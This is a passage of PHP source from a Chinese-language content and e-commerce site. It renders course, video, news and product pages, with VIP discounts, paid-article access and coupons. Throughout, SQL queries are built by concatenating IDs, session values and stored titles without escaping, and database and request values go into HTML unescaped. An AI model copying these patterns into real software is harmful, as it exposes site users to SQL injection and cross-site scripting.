        $t = str_Replace("[C_price]", $row["C_price"], $t);

        if ($C_c_discount < 10) {//普通VIP有折扣
            $s = "<span style=\"padding: 0 3px;background: #000000;color: #FFCC00;\">VIP￥<span id=\"price_v1\">" . p($row["C_price"] * $C_c_discount / 10) . "</span></span>";
        }
        if ($C_c_discount2 < $C_c_discount) {
            $s = $s . "<span style=\"background:#FFCC00;color:#000000;padding: 0 3px;border-radius: 0 5px 5px 0;\">SVIP￥<span id=\"price_v2\">" . p($row["C_price"] * $C_c_discount2 / 10) . "<span></span>";
        }
        $s = "<a target=\"_blank\" href=\"member/vip.php\" style=\"font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;\">" . $s . "</a>";
        $t = str_Replace("[C_vip]", $s, $t);

    }
    return $t;
}

function courseinfo($t)
{
    global $conn, $id, $C_c_discount, $C_c_discount2, $C_keyword, $C_description;
    $page = intval($_GET["page"]);
    if ($page == 0) {
        $page = 1;
    }

    if ($_SESSION["M_id"] != "") {
        $H_id = getrs("select * from sl_history where H_hid=$id and H_mid=" . $_SESSION["M_id"] . " and H_type=2", "H_id");
        if ($H_id != "") {
            mysqli_query($conn, "update sl_history set H_hid2=$page,H_time='" . date('Y-m-d H:i:s') . "' where H_id=$H_id");
        } else {
            mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_hid2,H_mid,H_time) values(2,$id,$page," . $_SESSION["M_id"] . ",'" . date('Y-m-d H:i:s') . "')");
        }
    }

    $genkey = date('YmdHis') . rand(1000, 9999);

    $sql = "select * from sl_course,sl_usort where C_sort=S_id and C_id=" . $id;
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $C_price = $row["C_price"];

        $lession = explode("||", $row["C_lesson"]);
        for ($i = 0; $i < count($lession); $i++) {
            if (strpos($lession[$i], "_") !== false) {
                $l = $l . $lession[$i] . "||";
            }
        }

        $ptitle = splitx(splitx($l, "||", ($page - 1)), "__", 0);
        $price = splitx(splitx($l, "||", ($page - 1)), "__", 1);
        $video = splitx(splitx($l, "||", ($page - 1)), "__", 2);

        $t = str_Replace("[S_id]", $row["S_id"], $t);
        $t = str_Replace("[C_id]", $row["C_id"], $t);
        $t = str_Replace("[C_title]", $row["C_title"], $t);
        $t = str_Replace("[C_ptitle]", $ptitle . " - " . $row["C_title"], $t);
        $t = str_Replace("[C_pic]", pic($row["C_pic"]), $t);
        $t = str_Replace("[C_price]", $row["C_price"], $t);

        $t = str_Replace("[C_video]", "", $t);
    }
    return $t;
}

function videos($t)
{
    global $conn, $id, $C_keyword, $C_description;
    $M_id = intval($_GET["M_id"]);
    if (intval($M_id) > 0) {
            $M = getrs("select * from sl_member where M_id=$M_id");
            $M_shop = $M["M_shop"];
            $M_head = $M["M_head"];
            $t = str_Replace("[S_id]", "0", $t);
            $t = str_Replace("[S_title]", $M_shop, $t);
            $t = str_Replace("[S_keywords]", $M_shop, $t);
            $t = str_Replace("[S_content]", $M_shop, $t);
            $t = str_Replace("[S_pic]", pic($M_head), $t);
        } else {
            $t = str_Replace("[S_id]", "0", $t);
            $t = str_Replace("[S_title]", "全部视频", $t);
            $t = str_Replace("[S_keywords]", "全部视频", $t);
            $t = str_Replace("[S_content]", "ALL VIDEOS", $t);
            $t = str_Replace("[S_pic]", pic("nopic.png"), $t);
        }
    return $t;
}

function videosinfo($t)
{
    global $conn, $id, $C_n_discount, $C_n_discount2, $C_keyword, $C_description, $C_newsds, $cur_lange;
    if ($_SESSION["M_id"] != "") {
        $H_id = getrs("select * from sl_history where H_hid=$id and H_mid=" . $_SESSION["M_id"] . " and H_type=1", "H_id");
        if ($H_id != "") {
            mysqli_query($conn, "update sl_history set H_time='" . date('Y-m-d H:i:s') . "' where H_id=$H_id");
        } else {
            mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_mid,H_time) values(1,$id," . $_SESSION["M_id"] . ",'" . date('Y-m-d H:i:s') . "')");
        }
    }

    $genkey = t($_GET["genkey"]);
    $chageLange = t($_GET["chageLange"]);
    if ($chageLange) {
        $cur_lange = $chageLange;
    }
    $sql = "select * from sl_videos where V_id=" . $id;
    $result = mysqli_query($conn, $sql);

    $row = mysqli_fetch_assoc($result);

    if (mysqli_num_rows($result) > 0) {
        $t = str_Replace("[N_id]", $row["V_id"], $t);
        $t = str_Replace("[N_title]", $row["V_title"], $t);
        $t = str_Replace("[N_pic]", pic($row["V_pic"]), $t);
        $t = str_Replace("[N_sort]", $row["V_order"], $t);
        $t = str_Replace("[N_date]", $row["V_date"], $t);
        $t = str_Replace("[N_price]", p($row["V_price"]), $t);
        $t = str_Replace("[N_keywords]", $C_keyword, $t);
        $t = str_Replace("[N_description]", $C_description, $t);
        $N_CUR_URL = "?type=videosinfo&id=" . $row["V_id"];
        $t = str_Replace("[N_CUR_URL]", $N_CUR_URL, $t);
        $t = str_Replace("[N_CUR_LANGE]", $cur_lange, $t);
        $N_content = editor_oss($row["V_content"]);
        if ($cur_lange != 'zh') {
            $temp = "N_content_" . $cur_lange;
            $N_content = editor_oss($row[$temp]);
        }

        if ($row["V_video"] != "") {
            if (substr($row["V_video"], 0, 7) == "http://" || substr($row["V_video"], 0, 8) == "https://") {
                $N_video = "<video width=\"100%\" style=\"max-height:500px;background:#000000\" poster=\"" . pic($row["V_pic"]) . "\" controls><source src=\"" . $row["V_video"] . "\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
            } else {
                $N_video = "<video width=\"100%\" style=\"max-height:500px;background:#000000\" poster=\"" . pic($row["V_pic"]) . "\" controls><source src=\"media/" . $row["V_video"] . "\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
            }
            $N_content = "<div style=\"margin-bottom:10px;\">" . $N_video . "</div>" . $N_content;
        }

        $N_price = p($row["V_price"]);
        $N_date = $row["V_date"];
        
        $length = mb_strlen(strip_tags($N_content), "utf-8");
        if (strpos($row["V_content"], "[fh_free]") !== false) {
            $N_preview = "<b>免费预览：</b>" . splitx($row["V_content"], "[fh_free]", 0) . "<div style=\"border-bottom:1px solid #EEEEEE;padding-bottom:30px;margin-bottom:30px;\"></div>";
        }
    }


    $sql = "select V_id,V_title from sl_videos where V_id = (select V_id from sl_videos where V_id < $id and V_del=0 order by V_id desc limit 1)";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if ($row["V_id"] == "") {
        $N_Ntitle = "没有了";
        $N_Nurl = "javascript:;";
    } else {
        $N_Ntitle = $row["V_title"];
        $N_Nurl = "?type=videosinfo&id=" . $row["V_id"] . "&chageLange=" . $cur_lange;
    }

    $sql = "select V_id,V_title from sl_videos where V_id = (select V_id from sl_videos where V_id > $id and V_del=0 order by V_id asc limit 1)";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if ($row["V_id"] == "") {
        $N_Ptitle = "没有了";
        $N_Purl = "javascript:;";
    } else {
        $N_Ptitle = $row["V_title"];
        $N_Purl = "?type=videosinfo&id=" . $row["V_id"] . "&chageLange=" . $cur_lange;
    }

    $t = str_Replace("[N_Ntitle]", $N_Ntitle, $t);
    $t = str_Replace("[N_Nurl]", $N_Nurl, $t);
    $t = str_Replace("[N_Ptitle]", $N_Ptitle, $t);
    $t = str_Replace("[N_Purl]", $N_Purl, $t);

    if ($N_price > 0) {
        //文章不免费
        if ($_SESSION["M_id"] != "") {//登录了会员
            $sql = "Select * from sl_neworders where buy_type=1 and bid=" . $id . " and mid=" . intval($_SESSION["M_id"]) . " order by id desc";
            $result = mysqli_query($conn, $sql);
            $row = mysqli_fetch_assoc($result);
            if (mysqli_num_rows($result) > 0) {
                //已购买
                if (empty($row["buy_time"])){
                    $buy_time = time();
                    $query = "update sl_neworders set buy_time=$buy_time where bid=$id and buy_type=1";
                    mysqli_query($conn,$query);
                }
                $N_tx = str_replace("[fh_free]", "", $N_content);
            } else {
                //没购买
                $N_tx = $N_preview . buyshipin("#f32196", $N_price, $id);
            }
        } else {
            //没登录会员
            $N_tx = $N_preview . buyshipin("#f32196", $N_price, $id);
        }
    } else {
        //免费
        $N_tx = str_replace("[fh_free]", "", $N_content);
    }

    $t = str_Replace("[N_content]", "<div id=\"N_tx\">" . $N_tx . "</div>", $t);

    return $t;
}

function newsinfo($t)
{
    global $conn, $id, $C_n_discount, $C_n_discount2, $C_keyword, $C_description, $C_newsds, $cur_lange;
    if ($_SESSION["M_id"] != "") {
        $H_id = getrs("select * from sl_history where H_hid=$id and H_mid=" . $_SESSION["M_id"] . " and H_type=1", "H_id");
        if ($H_id != "") {
            mysqli_query($conn, "update sl_history set H_time='" . date('Y-m-d H:i:s') . "' where H_id=$H_id");
        } else {
            mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_mid,H_time) values(1,$id," . $_SESSION["M_id"] . ",'" . date('Y-m-d H:i:s') . "')");
        }
    }

    $genkey = t($_GET["genkey"]);
    $chageLange = t($_GET["chageLange"]);
    if ($chageLange) {
        $cur_lange = $chageLange;
    }
    $sql = "select * from sl_news,sl_nsort where N_sort=S_id and N_id=" . $id;
    $result = mysqli_query($conn, $sql);

    $row = mysqli_fetch_assoc($result);

    if (mysqli_num_rows($result) > 0) {
        $t = str_Replace("[S_id]", $row["S_id"], $t);
        $t = str_Replace("[S_title]", $row["S_title"], $t);
        $t = str_Replace("[S_subid]", $row["S_sub"], $t);
        $t = str_Replace("[S_subtitle]", getrs("select * from sl_nsort where S_id=" . $row["S_sub"], "S_title"), $t);
        $t = str_Replace("[N_id]", $row["N_id"], $t);
        $t = str_Replace("[N_collection]", getrs("select count(C_id) as C_count from sl_colletion where C_cid=" . $row["N_id"] . " and C_type=1", "C_count"), $t);
        $t = str_Replace("[N_title]", $row["N_title"], $t);
        $t = str_Replace("[N_pic]", pic($row["N_pic"]), $t);
        $t = str_Replace("[N_sort]", $row["N_sort"], $t);
        $t = str_Replace("[N_view]", $row["N_view"], $t);
        $t = str_Replace("[N_author]", $row["N_author"], $t);
        $t = str_Replace("[N_date]", $row["N_date"], $t);
        $t = str_Replace("[N_price]", p($row["N_price"]), $t);
        if ($row["N_keywords"] == "") {
            $t = str_Replace("[N_keywords]", $C_keyword, $t);
        } else {
            $t = str_Replace("[N_keywords]", $row["N_keywords"], $t);
        }
        if ($row["N_description"] == "") {
            $t = str_Replace("[N_description]", $C_description, $t);
        } else {
            $t = str_Replace("[N_description]", $row["N_description"], $t);
        }
        $N_CUR_URL = "?type=newsinfo&id=" . $row["N_id"];
        $t = str_Replace("[N_CUR_URL]", $N_CUR_URL, $t);
        $t = str_Replace("[N_CUR_LANGE]", $cur_lange, $t);
        $N_vshow = $row["N_vshow"];
        $N_ds = $row["N_ds"];
        $N_dsintro = $row["N_dsintro"];
        $N_content = editor_oss($row["N_content"]);
        if ($cur_lange != 'zh') {
            $temp = "N_content_" . $cur_lange;
            $N_content = editor_oss($row[$temp]);
        }

        if ($row["N_video"] != "") {
            if (strpos($row["N_video"], "<") !== false) {
                $N_video = $row["N_video"];
            } else {
                if (substr($row["N_video"], 0, 7) == "http://" || substr($row["N_video"], 0, 8) == "https://") {
                    $N_video = "<video width=\"100%\" style=\"max-height:500px;background:#000000\" poster=\"" . pic($row["N_pic"]) . "\" controls><source src=\"" . $row["N_video"] . "\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
                } else {
                    $N_video = "<video width=\"100%\" style=\"max-height:500px;background:#000000\" poster=\"" . pic($row["N_pic"]) . "\" controls><source src=\"media/" . $row["N_video"] . "\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
                }
            }
            if ($N_vshow == 0) {
                $N_content = "<div style=\"margin-bottom:10px;\">" . $N_video . "</div>" . $N_content;
            } else {
                $N_content = $N_content . "<div style=\"margin-top:10px;\">" . $N_video . "</div>";
            }
        }
        if ($C_newsds != "" && $N_ds == 1) {
            $N_content = $N_content . "<hr><div style=\"text-align:center;\"><div style=\"font-weight:bold;font-size:15px;\">" . $N_dsintro . "</div>" . $C_newsds . "</div>";
        }

        $N_price = p($row["N_price"]);
        $N_date = $row["N_date"];
        $N_long = $row["N_long"];
        $N_tag = $row["N_tag"];
        $tag = explode(" ", $N_tag);
        for ($i = 0; $i < count($tag); $i++) {
            if ($tag[$i] != "") {
                $tags = $tags . "<a style=\"border:solid 1px #AAAAAA;display:inline-block;padding:2px 5px;border-radius:5px;margin:5px;font-size:12px;\" href=\"?type=news&tag=" . $tag[$i] . "\">" . $tag[$i] . "</a>";
            }
        }
        if ($N_tag != "") {
            $t = str_Replace("[N_tag]", "标签：" . $tags, $t);
        } else {
            $t = str_Replace("[N_tag]", "", $t);
        }
        $length = mb_strlen(strip_tags($N_content), "utf-8");
        if (strpos($row["N_content"], "[fh_free]") !== false) {
            $N_preview = "<b>免费预览：</b>" . splitx($row["N_content"], "[fh_free]", 0) . "<div style=\"border-bottom:1px solid #EEEEEE;padding-bottom:30px;margin-bottom:30px;\"></div>";
        }
    }


    $sql = "select N_id,N_title from sl_news where N_id = (select N_id from sl_news where N_id < $id and N_del=0 order by N_id desc limit 1)";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if ($row["N_id"] == "") {
        $N_Ntitle = "没有了";
        $N_Nurl = "javascript:;";
    } else {
        $N_Ntitle = $row["N_title"];
        $N_Nurl = "?type=newsinfo&id=" . $row["N_id"] . "&chageLange=" . $cur_lange;
    }

    $sql = "select N_id,N_title from sl_news where N_id = (select N_id from sl_news where N_id > $id and N_del=0 order by N_id asc limit 1)";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if ($row["N_id"] == "") {
        $N_Ptitle = "没有了";
        $N_Purl = "javascript:;";
    } else {
        $N_Ptitle = $row["N_title"];
        $N_Purl = "?type=newsinfo&id=" . $row["N_id"] . "&chageLange=" . $cur_lange;
    }

    $t = str_Replace("[N_Ntitle]", $N_Ntitle, $t);
    $t = str_Replace("[N_Nurl]", $N_Nurl, $t);
    $t = str_Replace("[N_Ptitle]", $N_Ptitle, $t);
    $t = str_Replace("[N_Purl]", $N_Purl, $t);

    if ($N_price > 0) {
        //文章不免费
        if ($_SESSION["M_id"] != "") {//登录了会员
            $sql = "Select * from sl_neworders where buy_type=0 and bid=" . $id . " and mid=" . intval($_SESSION["M_id"]) . " order by id desc";
            $result = mysqli_query($conn, $sql);
            $row = mysqli_fetch_assoc($result);
            if (mysqli_num_rows($result) > 0) {
                //已购买
                if (empty($row["buy_time"])){
                    $buy_time = time();
                    $query = "update sl_neworders set buy_time=$buy_time where bid=$id and buy_type=0";
                    mysqli_query($conn,$query);
                    $N_tx = str_replace("[fh_free]", "", $N_content);
                }else{
                    $buy_time = $row["buy_time"];
                    $buy_longtime = $row["buy_longtime"]*60;
                    $buy_time_check = $buy_time + $buy_longtime;
                    if (time() <= $buy_time_check){
                        $N_tx = str_replace("[fh_free]", "", $N_content);
                    }else{
                        $N_tx = $N_preview . buywenzhang("#f32196", $N_price, $id);
                    }
                }
            } else {
                //没购买
                $N_tx = $N_preview . buywenzhang("#f32196", $N_price, $id);
            }
        } else {
            //没登录会员
            $N_tx = $N_preview . buywenzhang("#f32196", $N_price, $id);
        }
    } else {
        //免费
        $N_tx = str_replace("[fh_free]", "", $N_content);
    }

    $t = str_Replace("[N_content]", "<div id=\"N_tx\">" . $N_tx . "</div>", $t);

    return $t;
}

function product($t)
{
    global $conn, $id, $C_keyword, $C_description;
    $M_id = intval($_GET["M_id"]);
    $sql = "select * from sl_psort where S_id=" . $id;
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $t = str_Replace("[S_id]", $row["S_id"], $t);
        $t = str_Replace("[S_sub]", $row["S_sub"], $t);
        $t = str_Replace("[S_pic]", pic($row["S_pic"]), $t);
        $t = str_Replace("[S_title]", $row["S_title"], $t);
        $t = str_Replace("[S_order]", $row["S_order"], $t);
        if ($row["S_content"] == "") {
            $t = str_Replace("[S_content]", $C_description, $t);
        } else {
            $t = str_Replace("[S_content]", $row["S_content"], $t);
        }
        if ($row["S_keywords"] == "") {
            $t = str_Replace("[S_keywords]", $C_keyword, $t);
        } else {
            $t = str_Replace("[S_keywords]", $row["S_keywords"], $t);
        }
    } else {
        if (intval($M_id) > 0) {
            $M = getrs("select * from sl_member where M_id=$M_id");
            $M_shop = $M["M_shop"];
            $M_head = $M["M_head"];
            $t = str_Replace("[S_id]", "0", $t);
            $t = str_Replace("[S_title]", $M_shop, $t);
            $t = str_Replace("[S_content]", $M_shop, $t);
            $t = str_Replace("[S_keywords]", $M_shop, $t);
            $t = str_Replace("[S_pic]", pic($M_head), $t);
        } else {
            $t = str_Replace("[S_id]", "0", $t);
            $t = str_Replace("[S_title]", "全部商品", $t);
            $t = str_Replace("[S_keywords]", "全部商品", $t);
            $t = str_Replace("[S_content]", "ALL PRODUCT", $t);
            $t = str_Replace("[S_pic]", pic("nopic.png"), $t);
        }
    }
    return $t;
}

function productinfo($t)
{
    global $conn, $id, $C_notice, $C_keyword, $C_description, $C_p_discount, $C_p_discount2, $C_fx1, $C_fx2, $C_fx3, $config;

    if ($_SESSION["M_id"] != "") {
        $H_id = getrs("select * from sl_history where H_hid=$id and H_mid=" . $_SESSION["M_id"] . " and H_type=0", "H_id");
        if ($H_id != "") {
            mysqli_query($conn, "update sl_history set H_time='" . date('Y-m-d H:i:s') . "' where H_id=$H_id");
        } else {
            mysqli_query($conn, "insert into sl_history(H_type,H_hid,H_mid,H_time) values(0,$id," . $_SESSION["M_id"] . ",'" . date('Y-m-d H:i:s') . "')");
        }
    }

    $B_count = getrs("select count(*) as B_count from sl_orders where O_del=0 and O_state>0 and O_pid=" . $id, "B_count");
    $E_count = getrs("select count(*) as E_count from sl_evaluate,sl_orders where O_del=0 and E_del=0 and O_state>0 and E_oid=O_id and O_pid=$id", "E_count");

    $sql = "select * from sl_product,sl_psort where P_sort=S_id and P_id=" . $id;
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $P_fx = $row["P_fx"];
        $P_price = $row["P_price"];
        $t = str_Replace("[S_title]", $row["S_title"], $t);
        $t = str_Replace("[S_id]", $row["S_id"], $t);
        $t = str_Replace("[S_subid]", $row["S_sub"], $t);
        $t = str_Replace("[S_subtitle]", getrs("select * from sl_psort where S_id=" . $row["S_sub"], "S_title"), $t);
        $t = str_Replace("[P_id]", $row["P_id"], $t);
        $t = str_Replace("[P_collection]", getrs("select count(C_id) as C_count from sl_colletion where C_cid=" . $row["P_id"] . " and C_type=0", "C_count"), $t);
        $t = str_Replace("[P_title]", $row["P_title"], $t);
        $t = str_Replace("[P_view]", $row["P_view"], $t);
        $t = str_Replace("[P_time]", $row["P_time"], $t);
        $t = str_Replace("[P_sold]", $row["P_sold"], $t);
        if ($row["P_keywords"] == "") {
            $t = str_Replace("[P_keywords]", $C_keyword, $t);
        } else {
            $t = str_Replace("[P_keywords]", $row["P_keywords"], $t);
        }
        if ($row["P_description"] == "") {
            $t = str_Replace("[P_description]", $C_description, $t);
        } else {
            $t = str_Replace("[P_description]", $row["P_description"], $t);
        }
        $t = str_Replace("[P_pic]", pic(splitx($row["P_pic"], "|", 0)), $t);
        if ($row["P_mid"] == 0) {
            $zy = "<span style=\"font-size:12px;background:#c81623;border-radius:5px;padding:2px 3px;color:#ffffff;margin-right:5px;display:inline;\">自营</span>";
            $shop = "<span style=\"font-size:12px;background:#c81623;border-radius:5px;padding:2px 3px;color:#ffffff;display:inline;margin:0 2px;\">官方自营店</span>";
        } else {
            $zy = "";
            $shop = "<a href=\"./?type=product&M_id=" . intval($row["P_mid"]) . "\" style=\"font-size:12px;background:#0099ff;border-radius:5px;padding:2px 3px;color:#ffffff;display:inline;margin:0 2px;\">" . getrs("select * from sl_member where M_id=" . intval($row["P_mid"]), "M_shop") . "</a>";
        }
        $t = str_Replace("[P_zy]", $zy, $t);
        $t = str_Replace("[P_shop]", $shop, $t);

        $P_content = editor_oss($row["P_content"]);

        if ($P_fx == 1 && $P_price > 0 && ($C_fx1 > 0 || $C_fx2 > 0 || $C_fx3 > 0)) {
            $P_content = "<div style=\"padding:20px;margin-bottom:20px;background:url('images/pricebg.png')\">分享商品可得佣金【" . ($C_fx1 * $P_price / 100) . "元】 <a style=\"float:right;background:#f32196;color:#ffffff;border-radius:5px;padding:0 5px\" href=\"conn/poster.php?type=product&id=$id&from=" . intval($_SESSION["M_id"]) . "\">点击参与</a></div>" . $P_content;
        }

        $P_vshow = $row["P_vshow"];

        if ($row["P_shuxing"] != "") {
            $s = explode("\r", $row["P_shuxing"]);
            for ($i = 0; $i < count($s); $i++) {
                $shuxing = $shuxing . "<div style=\"width:33%;display:inline-block\">" . $s[$i] . "</div>";
            }
            $shuxing = "<div style=\"background:#f7f7f7;border:solid 1px #DDDDDD;padding:20px;margin-bottom:10px;\"><p><b>商品参数：</b></p>" . $shuxing . "</div>";
        }
        if ($row["P_video"] != "") {
            if (strpos($row["P_video"], "<") !== false) {
                $P_video = $row["P_video"];
            } else {
                if (substr($row["P_video"], 0, 7) == "http://" || substr($row["P_video"], 0, 8) == "https://") {
                    $P_video = "<video width=\"100%\" style=\"max-height:500px;background:#000000;\"  poster=\"" . pic(splitx($row["P_pic"], "|", 0)) . "\" controls><source src=\"" . $row["P_video"] . "\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
                } else {
                    $P_video = "<video width=\"100%\"  style=\"max-height:500px;background:#000000;\" poster=\"" . pic(splitx($row["P_pic"], "|", 0)) . "\" controls><source src=\"media/" . $row["P_video"] . "\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
                }
            }
            if ($P_vshow == 0) {
                $P_content = "<div style=\"margin-bottom:10px;\">" . $P_video . "</div>" . $P_content;
            } else {
                $P_content = $P_content . "<div style=\"margin-bottom:10px;\">" . $P_video . "</div>";
            }
        }
        $t = str_Replace("[P_shuxing]", $shuxing, $t);
        $t = str_Replace("[P_content]", $P_content, $t);
        $t = str_Replace("[P_sort]", $row["P_sort"], $t);
        if ($row["P_viponly2"] == 1) {
            $s = "<a target=\"_blank\" href=\"member/vip.php\" style=\"font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;\"><span style=\"padding: 0 3px;background: #000000;color: #FFCC00;\">仅限永久VIP购买</span></a>";
            $t = str_Replace("[P_vip]", $s, $t);
        } else {
            if ($row["P_viponly"] == 1) {
                $s = "<a target=\"_blank\" href=\"member/vip.php\" style=\"font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;background: #fc0;\"><span style=\"padding: 0 3px;color: #000;\">仅限VIP购买</span></a>";
                $t = str_Replace("[P_vip]", $s, $t);
            } else {
                if ($row["P_vip"] == 1) {//如果商品开启了参与VIP活动
                    if ($C_p_discount < 10) {//普通VIP有折扣
                        $s = "<span style=\"padding: 0 3px;background: #000000;color: #FFCC00;\">VIP￥<span id=\"price_v1\">" . p($row["P_price"] * $C_p_discount / 10) . "</span></span>";
                    }
                    if ($C_p_discount2 < $C_p_discount) {
                        $s = $s . "<span style=\"background:#FFCC00;color:#000000;padding: 0 3px;border-radius: 0 5px 5px 0;\">SVIP￥<span id=\"price_v2\">" . p($row["P_price"] * $C_p_discount2 / 10) . "<span></span>";
                    }
                    $s = "<a target=\"_blank\" href=\"member/vip.php\" style=\"font-size: 12px;border-radius: 5px;margin-left: 10px;margin-right: 10px;font-weight: bold;border:solid 1px #000000;\">" . $s . "</a>";
                    $t = str_Replace("[P_vip]", $s, $t);
                } else {
                    $t = str_Replace("[P_vip]", "", $t);
                }
            }
        }

        $t = str_Replace("[P_price]", p($row["P_price"]), $t);
        $t = str_Replace("[P_sell]", $row["P_sell"], $t);
        $t = str_Replace("[P_selltype]", $row["P_selltype"], $t);
        $t = str_Replace("[B_count]", $B_count, $t);
        $t = str_Replace("[E_count]", $E_count, $t);
        $P_price = $row["P_price"];
        $P_selltype = $row["P_selltype"];
        $P_sell = $row["P_sell"];
        $P_gg = $row["P_gg"];
        $P_ggsell = $row["P_ggsell"];
        $P_restx = $row["P_rest"];
        $P_tag = $row["P_tag"];
        $P_mid = $row["P_mid"];
        $tag = explode(" ", $P_tag);
        for ($i = 0; $i < count($tag); $i++) {
            $tags = $tags . "<a style=\"border:solid 1px #AAAAAA;display:inline-block;padding:2px 5px;border-radius:5px;margin:5px;font-size:12px;\" href=\"?type=product&tag=" . $tag[$i] . "\">" . $tag[$i] . "</a>";
        }
        if ($P_tag != "") {
            $t = str_Replace("[P_tag]", "标签：" . $tags, $t);
        } else {
            $t = str_Replace("[P_tag]", "", $t);
        }

        $sql = "select Q_title,Q_pid from (select * from sl_quan where ((Q_fid=" . $P_mid . " and Q_pid=0) or (Q_pid=" . $id . " and Q_fid=" . $P_mid . ")) and Q_del=0 and Q_hide=0 and Q_gettime>now())b group by Q_title,Q_pid order by Q_pid asc";
        $result = mysqli_query($conn, $sql);
        if (mysqli_num_rows($result) > 0) {
            while ($row = mysqli_fetch_assoc($result)) {
                $Q = getrs("select * from sl_quan where Q_title='" . $row["Q_title"] . "'");
                $rest = getrs("select count(Q_id) as Q_count from sl_quan where Q_del=0 and Q_hide=0 and Q_mid=0 and Q_gettime>now() and Q_title='" . $Q["Q_title"] . "'", "Q_count");
                if ($Q["Q_pid"] > 0) {
                    $P_info = "商品优惠券";
                } else {
                    $P_info = "店铺优惠券";
                }

                if ($Q["Q_discount"] > 0) {
                    $D_info = "" . ((100 - $Q["Q_discount"]) / 10) . "折";
                } else {
                    $D_info = "";
                }

                if ($Q["Q_minuse"] > 0) {
                    $M_info = "" . $Q["Q_minuse"] . "元";
                } else {
                    $M_info = "";
                }

                if ($_SESSION["M_id"] != "" && getrs("select * from sl_quan where Q_mid=" . intval($_SESSION["M_id"]) . " and Q_title='" . $Q["Q_title"] . "'")) {
                    $btn = "<span style=\"color:#f32196;border-bottom: 1px dotted #f32196;\">已领</span>";
                } else {
                    $btn = "<span id=\"quan_btn_" . $Q["Q_id"] . "\" style=\"color:#f32196;border-bottom: 1px dotted #f32196;cursor:pointer;\" onclick=\"getquan(" . $Q["Q_id"] . ")\">领券</span> <span id=\"login_" . $Q["Q_id"] . "\"></span>";
                }

                $quan = $quan . "
		    <script>
			function getquan(id){
				\$.ajax({
		            url: \"conn/f.php?action=getquan&Q_id=\"+id,
		            success: function(data) {
		                data = JSON.parse(data);
		                if (data.code == \"success\") {
		                    \$(\"#quan_btn_\"+id).html(\"已领\");
		                    \$(\"#quan_btn_\"+id).attr(\"onclick\",\"\");
		                } else {
		                    alert(data.msg);
		                    if(data.msg==\"请先登录会员帐号！\"){
		                    	\$(\"#login_\"+id).html(\"<a style='color:#f32196;border-bottom: 1px dotted #f32196;cursor:pointer;' href='member/login.php?from=\"+encodeURIComponent(window.location.href)+\"'>登录</a>\");
		                    }
		                }
		            }
		        });
			}
			</script>
		        <div style=\"margin-bottom:8px;\"><span style=\"color:#f32196;border:solid 1px #f32196;border-radius:5px;padding:0 2px\"><span style=\"border-right: 1px dotted #f32196;padding-right:5px;margin-right:5px\">" . $Q["Q_title"] . "</span>" . $P_info . "</span> " . $M_info . $D_info . "优惠券 满" . $Q["Q_money"] . "元可用 " . $btn . "</div>";
            }
        }
        if ($quan != "") {
            if (!isMobile()) {
                $quan = "<div style=\"display:inline-block;width:50px;float:left\"><b>优惠</b></div><div style=\"display:inline-block;width:calc(100% - 50px);font-size:12px\">" . $quan . "</div>";
            }
        }
        if ($config->quan == "true") {
            $t = str_Replace("[P_quan]", $quan, $t);
        } else {
            $t = str_Replace("[P_quan]", "", $t);
        }

        $P_js = "
			<script>
			var P_price=$P_price;
			\$(function() {
			\$('#buy label').click(function(){
				var aa = \$(this).attr('aa');\$('[aa='+aa+']').removeAttr('class') ;\$(this).attr('class','checked');
				if(\$(this).attr(\"data-pic\")!=''){
					\$(\"#P_pic\").attr(\"src\",\$(this).attr(\"data-pic\"));
				}
			});
			\$(\"#buy label[data-title]\").click(function(){
				\$(\"label[class='checked'][data-title]\").each(function(i){

			        if(0==i){
			        	if(\$(this).attr(\"data-price\").substr(0,1)==\"*\"){
			        		q = Number(\$(this).attr(\"data-price\").substr(1));
			        		p = 0;
			        	}else{
			        		q = 1;
			        		p = Number(\$(this).attr(\"data-price\"));
			        	}
			            t = \$(this).attr(\"data-title\");
			        }else{
			        	if(\$(this).attr(\"data-price\").substr(0,1)==\"*\"){
			        		q = q * Number(\$(this).attr(\"data-price\").substr(1));
			        	}else{
			        		p = p + Number(\$(this).attr(\"data-price\"));
			        	}
			            t=t+\" \"+\$(this).attr(\"data-title\");
			        }
			    });
				\$(\"#price\").html(((P_price+p)*q).toFixed(2));
				\$(\"#price_v1\").html(((P_price+p)*q*" . ($C_p_discount / 10) . ").toFixed(2));
				\$(\"#price_v2\").html(((P_price+p)*q*" . ($C_p_discount2 / 10) . ").toFixed(2));
				\$(\"#gg_title\").html(t);

				if(\$(this).attr(\"aa\").split(\"_\")[1]==0){
					\$(\"#gg_rest\").html(\$(this).attr(\"data-restTitle\"));
					\$(\"#buy #plus\").attr(\"onClick\",\"javascript:if(this.form.amount.value<\"+\$(this).attr(\"data-rest\")+\"){this.form.amount.value++;}\");
					if(\$(this).attr(\"data-rest\")<\$(\"#amount\").val()){
						\$(\"#amount\").val(\$(this).attr(\"data-rest\"));
					}
					if(\$(this).attr(\"data-rest\")==0){
						\$(\"#buy button\").attr(\"disabled\",\"true\");
						\$(\"#buy button\").html(\"暂时缺货\");
						\$(\"#buy input[type='submit']\").attr(\"disabled\",\"true\");
